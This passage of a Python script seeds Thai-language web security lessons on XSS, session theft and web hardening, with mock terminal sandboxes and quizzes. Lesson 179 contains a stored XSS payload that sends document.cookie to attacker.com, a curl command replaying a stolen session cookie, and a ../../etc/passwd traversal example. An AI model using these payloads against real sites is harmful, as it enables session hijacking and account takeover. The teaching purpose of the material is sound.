    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

save_lesson(178, val178_0, val178_1, val178_2)

# ─── 3. Lesson 179: Broken Authentication & XSS ───
val179_0 = """## 🔒 Broken Authentication & XSS (การควบคุมสิทธิ์บกพร่องและ XSS)
---

ยินดีต้อนรับสู่บทเรียนช่องโหว่การโจมตีระบบรักษาความปลอดภัยเซสชัน (Authentication) และการลอบส่งสคริปต์ก่อกวนบราวเซอร์ (Cross-Site Scripting)

<style>
.w-neon-card {
  background: rgba(6, 8, 20, 0.45) !important;
  border: 1px solid rgba(59, 130, 246, 0.15) !important;
  border-radius: 12px !important;
  padding: 20px !important;
  margin-bottom: 24px !important;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 0 15px rgba(59,130,246,0.02) !important;
}
.w-xss-badge {
  font-family: 'JetBrains Mono', monospace;
  background: rgba(59,130,246,0.08);
  color: #3b82f6;
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 0.72rem;
  font-weight: 700;
}
</style>

### 🍪 1. Web Cookies Core Attributes
คุกกี้ที่ใช้รักษาสิทธิ์เซสชันความปลอดภัยในการล็อกอิน ประกอบด้วยคุณลักษณะสำคัญ:
<div class="w-neon-card">
  <ul style="padding-left:16px; font-size:0.78rem; color:#cbd5e1; line-height:1.65; margin:0;">
    <li><strong>HttpOnly</strong> : ปิดกั้นไม่ให้ JavaScript ดึงค่าคุกกี้ไปรัน (บรรเทาภัยขโมยสิทธิ์จากช่องโหว่ XSS)</li>
    <li><strong>Secure</strong> : กำหนดให้คุกกี้จัดส่งเฉพาะการรันรหัสผ่านโปรโตคอลความปลอดภัย HTTPS เท่านั้น</li>
    <li><strong>SameSite</strong> : คุมสิทธิ์การส่งคุกกี้ข้ามค่าย ป้องกันช่องโหว่ CSRF (Cross-Site Request Forgery)</li>
  </ul>
</div>

---

### 📂 2. Path & Directory Traversal ( robots.txt & Fuzzers )
ช่องโหว่การขยับย้อนสืบหาความสัมพันธ์ไฟล์ระบบ (เช่น <span class="w-xss-badge">../../etc/passwd</span>):
<div class="w-neon-card">
  <ul style="padding-left:16px; font-size:0.78rem; color:#cbd5e1; line-height:1.65; margin:0;">
    <li><strong>Robots.txt abuse</strong> : ไฟล์ระบุการห้ามบอตค้นหาของบราวเซอร์ แต่เปรียบเสมือนแผนที่ชี้เป้าหมายแอดมินพาเนลชั้นดี</li>
    <li><strong>Dirb / Dirbuster</strong> : คำสั่งและ GUI สำหรับ Brute-force สแกนพิกัดโฟลเดอร์ที่ซ่อนอยู่หลังบ้าน</li>
    <li><strong>FFUF / Gobuster</strong> : สคริปต์สแกน fuzzer ค้นหา directory และ subdomains ไฮสปีดในภาษา Go</li>
  </ul>
</div>"""

val179_1 = """### 💻 XSS & Session Theft Sandbox (จำลองเจาะช่องโหว่ลอบรันสคริปต์)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาแนวทางโจมตี XSS และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลลัพธ์:

<div class="w-sandbox-main"><div class="w-sandbox-nav"><button id="nav-item-xssstored" class="w-nav-item active" onclick="showSandboxItem('xssstored', this)">1. Stored XSS Payload</button><button id="nav-item-cookietheft" class="w-nav-item" onclick="showSandboxItem('cookietheft', this)">2. Session Cookie Theft</button></div><div class="w-sandbox-panels"><div id="panel-xssstored" class="w-sand-panel"><div class="w-sand-hdr"><span>1. Stored XSS Exploit Scenario</span> <span class="tag">Stored XSS</span></div><pre class="w-sand-code">&lt;script&gt;fetch("http://attacker.com/log?cookie=" + document.cookie)&lt;/script&gt;</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startXSSSim('xssstored')">▶ Run Simulation</button></div><div id="term-xssstored" class="w-sand-term"><span class="prompt">browser$</span> [กดปุ่ม Run Simulation เพื่อเปิดรัน XSS สคริปต์]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>สคริปต์ JavaScript จะดึงเอาค่า Cookie ล็อกอินของเหยื่อที่กดเปิดเข้ามาชมหน้าเว็บ ส่งกลับไปยังเซิร์ฟเวอร์ของนักโจมตีทันที</p></div></div><div id="panel-cookietheft" class="w-sand-panel"><div class="w-sand-hdr"><span>2. Session Hijacking with Cookie</span> <span class="tag">Session Theft</span></div><pre class="w-sand-code">curl -H "Cookie: session_id=abc123xyz" http://ctf.rpca.ac.th/admin/dashboard.php</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startXSSSim('cookietheft')">▶ Run Simulation</button></div><div id="term-cookietheft" class="w-sand-term"><span class="prompt">attacker$</span> [กดปุ่ม Run Simulation เพื่อส่งสวมรอยคุกกี้]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>นักโจมตีใช้คุกกี้ที่ขโมยมาส่งแนบไปใน Request Header เพื่อล็อกอินผ่านระบบสวมสิทธิ์แอดมินโดยตรง</p></div></div></div></div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.setProperty('display', 'none', 'important'); });
  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) { targetPanel.style.setProperty('display', 'block', 'important'); }
}
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);
window.startXSSSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span class="prompt">attacker$</span> <span class="cmd">Listening for incoming connections...</span>\\n[.] Processing payload reflection\\n[.] Catching credentials...';
  setTimeout(() => {
    if (itemKey === 'xssstored') {
      term.innerHTML = '<span class="prompt">browser$</span> <span class="cmd">Script executing:</span>\\n[+] XSS payload triggered!\\n[+] Exfiltrating document.cookie to attacker.com\\n[+] Stolen Session: <span style="color:#ef4444; font-weight:bold;">session_id=abc123xyz</span>';
    } else if (itemKey === 'cookietheft') {
      term.innerHTML = '<span class="prompt">attacker$</span> <span class="cmd">curl -H "Cookie: session_id=abc123xyz" ...</span>\\nHTTP/1.1 200 OK\\nWelcome back Administrator! (Access Granted)\\n\\n[+] Session Hijacking succeeded!';
    }
  }, 1000);
}
</script>"""

val179_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ช่องโหว่ Cross-Site Scripting (XSS) เกิดจากการลอบฝังแทรกสคริปต์โค้ดประเภทใดเข้ามาทำงานฝั่ง Client Browser?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="xss_lang" value="SQL" data-hash="false">SQL Query code</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="JavaScript" data-hash="78ec09be8733f52e505820464fdbb19d45388047970d47d457cb146ef279ec3d">JavaScript</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="Bash" data-hash="false">Bash Shell command</label><label class="w-quiz-option"><input type="radio" name="xss_lang" value="PHP" data-hash="false">PHP Server Script</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. คีย์เวิร์ดมาตรฐาน HTML tag ใดที่นักโจมตีใช้ส่ง XSS Payload เพื่อเปิดจำลองกล่องป๊อปอัพ?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="xss_tag" value="script" data-hash="3a95aa975765796245d8b8ff716d0046522bb33f749eb721867c4e515d18d451"><span>&lt;script&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="iframe" data-hash="false"><span>&lt;iframe&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="div" data-hash="false"><span>&lt;div&gt;</span></label><label class="w-quiz-option"><input type="radio" name="xss_tag" value="img" data-hash="false"><span>&lt;img&gt;</span></label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<script>
const lessonKey = 'solved_lesson_179';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#3b82f6';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

save_lesson(179, val179_0, val179_1, val179_2)

# ─── 4. Lesson 180: Web Hardening & API Security ───
val180_0 = """## 🛡️ Web Hardening & API Security (การป้องกันและการทดสอบความปลอดภัยเว็บ)
---

ยินดีต้อนรับสู่บทเรียนการตั้งรับและการเสริมความแข็งแกร่งความปลอดภัยให้กับระบบ Web Server และระบบการเชื่อมโยงข้อมูลหลังบ้าน (API Security)

<style>
.w-neon-card {
  background: rgba(6, 8, 20, 0.45) !important;
  border: 1px solid rgba(16, 185, 129, 0.15) !important;
  border-radius: 12px !important;
  padding: 20px !important;
  margin-bottom: 24px !important;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 0 15px rgba(16,185,129,0.02) !important;
}
.w-code-inline {
  font-family: 'JetBrains Mono', monospace;
  background: rgba(16,185,129,0.08);
  color: #10b981;
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 0.76rem;
  font-weight: 700;
}
</style>

### 📡 1. Unusual HTTP Methods & User-Agent Spoofing
การตรวจสอบทราฟฟิกลบล้างการแฝงตัวผ่านหัวข้อสิทธิ์ HTTP:
<div class="w-neon-card">
  <ul style="padding-left:16px; font-size:0.78rem; color:#cbd5e1; line-height:1.65; margin:0;">
    <li><strong>Unusual HTTP Methods</strong> : การใช้ OPTIONS, TRACE, WebDAV (MKCOL, COPY, LOCK) เพื่อดูโครงสร้างหรือเปลี่ยนชื่อไฟล์ระบบ</li>
    <li><strong>User-Agent Spoofing</strong> : นักโจมตีปลอมชื่อบราวเซอร์ (เช่น แอบอ้างเป็น Googlebot) หรือลบ User-Agent ทิ้งเพื่อปัดการเฝ้าระวังของแอดมิน</li>
    <li><strong>Large / Encoded POST</strong> : การซ่อน Payload ขนาดใหญ่ (เช่น Web shells หรือ Base64 payload) เพื่อเจาะข้ามระบบตรวจจับ Web Application Firewall (WAF)</li>
  </ul>
</div>

---

### 🔑 2. Secure Coding & Web Hardening
- 🚫 **X-Frame-Options: SAMEORIGIN** : บังคับห้ามนำเพจไปซ้อน Iframe
- 🔒 **Content-Security-Policy (CSP)** : จำกัดการลอบฝังดาวน์โหลดโค้ดสคริปต์ XSS
- 🧼 **Input Sanitization** : ถอดรหัสคีย์อักขระพิเศษ `<script>` ก่อนนำลงประมวลผลเซิร์ฟเวอร์"""

val180_1 = """### 💻 Security Headers Hardening Sandbox (จำลองตั้งหัวข้อปิดกั้นช่องโหว่)

คลิกหัวข้อด้านซ้ายมือเพื่อจำลอง และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูทราฟฟิกข้อมูลหลัง Hardening:

<div class="w-sandbox-main"><div class="w-sandbox-nav"><button id="nav-item-xframe" class="w-nav-item active" onclick="showSandboxItem('xframe', this)">1. Header: X-Frame-Options</button><button id="nav-item-csp" class="w-nav-item" onclick="showSandboxItem('csp', this)">2. Header: CSP policy</button></div><div class="w-sandbox-panels"><div id="panel-xframe" class="w-sand-panel"><div class="w-sand-hdr"><span>1. Clickjacking Prevention</span> <span class="tag">X-Frame</span></div><pre class="w-sand-code">X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startHardSim('xframe')">▶ Run Simulation</button></div><div id="term-xframe" class="w-sand-term"><span class="prompt">web-server$</span> [กดปุ่ม Run Simulation เพื่อจำลองความแข็งแกร่ง]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>การตั้งค่า SAMEORIGIN จะบังคับให้บราวเซอร์เปิดแสดงผล Iframe เฉพาะโดเมนเนมเจ้าของเดียวกันเท่านั้น</p></div></div><div id="panel-csp" class="w-sand-panel"><div class="w-sand-hdr"><span>2. Content Security Policy Setup</span> <span class="tag">CSP Header</span></div><pre class="w-sand-code">Content-Security-Policy: default-src 'self'; script-src 'self'</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startHardSim('csp')">▶ Run Simulation</button></div><div id="term-csp" class="w-sand-term"><span class="prompt">web-server$</span> [กดปุ่ม Run Simulation เพื่อจำลองส่งหัวข้อ CSP]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>CSP บังคับห้ามบราวเซอร์เรียกใช้งานดาวน์โหลดสคริปต์ภายนอกมารัน ปิดช่องโหว่ XSS ทุกรูปแบบ</p></div></div></div></div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.setProperty('display', 'none', 'important'); });
  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) { targetPanel.style.setProperty('display', 'block', 'important'); }
}
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);
window.startHardSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span class="prompt">web-server$</span> <span class="cmd">Applying Web Hardening policies...</span>\\n[.] Configuring HTTP response filters...';
  setTimeout(() => {
    if (itemKey === 'xframe') {
      term.innerHTML = '<span class="prompt">web-server$</span> <span class="cmd">HTTP Headers verified:</span>\\n[+] X-Frame-Options: SAMEORIGIN (Active)\\n[+] X-Content-Type-Options: nosniff (Active)\\n[+] Clickjacking vulnerability successfully mitigated!';
    } else if (itemKey === 'csp') {
      term.innerHTML = '<span class="prompt">web-server$</span> <span class="cmd">CSP audit result:</span>\\n[+] Content-Security-Policy: default-src \'self\' ... (Active)\\n[+] JavaScript execution restricted to same origin.\\n[+] Reflected/Stored XSS scripts blocked by client browser!';
    }
  }, 1000);
}
</script>"""

val180_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ส่วนหัว (Header) ความปลอดภัยใดใน HTTP Response ที่ใช้ป้องกันหน้าเว็บไม่ให้ถูกนำไปฝังใน Iframe เพื่อเลี่ยงช่องโหว่ Clickjacking?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="xframe_h" value="X-Frame-Options" data-hash="c9b7f5256e2978000bd93d8435d648b26e03fb21884be5e38f6b864a66e4a2cd">X-Frame-Options</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="CSP" data-hash="false">Content-Security-Policy</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="HSTS" data-hash="false">Strict-Transport-Security</label><label class="w-quiz-option"><input type="radio" name="xframe_h" value="XXSS" data-hash="false">X-XSS-Protection</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. หลักปฏิบัติเพื่อความปลอดภัยในการป้องกันการแทรกโค้ดทำลายระบบเครือข่ายฐานข้อมูล (Injection) ทุกประเภทคือข้อใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Input Validation" data-hash="277bc1b69ad3178c775080e7221f75355694a08ba1c38fa8b79f38ebcb5c8a41">การกรองตรวจสอบความถูกต้องข้อมูลนำเข้า (Input Validation)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Encryption" data-hash="false">การเข้ารหัสฐานข้อมูล (Database Encryption)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="Backup" data-hash="false">การสำรองไฟล์ข้อมูลประจำวัน (Daily Backup)</label><label class="w-quiz-option"><input type="radio" name="sec_coding" value="IDS" data-hash="false">การติดตั้งระบบแจ้งเตือนแฮกเกอร์ (Intrusion Detection)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<script>
const lessonKey = 'solved_lesson_180';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#10b981';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

save_lesson(180, val180_0, val180_1, val180_2)

ctx.pop()
